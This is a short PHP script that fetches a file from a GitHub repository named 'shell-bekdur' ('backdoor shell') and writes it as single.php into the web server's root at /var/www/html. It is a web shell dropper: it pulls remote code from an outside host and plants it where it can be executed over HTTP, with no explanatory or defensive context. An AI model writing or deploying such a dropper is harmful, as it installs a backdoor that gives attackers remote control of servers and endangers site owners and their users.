<?php
$url = "https://raw.githubusercontent.com/sievern/shell-bekdur/refs/heads/main/single.php";
$outputFile = "/var/www/html/single.php";

$ch = curl_init($url);
$fp = fopen($outputFile, 'w');

curl_setopt($ch, CURLOPT_FILE, $fp);
curl_setopt($ch, CURLOPT_HEADER, 0);

curl_exec($ch);
curl_close($ch);
fclose($fp);
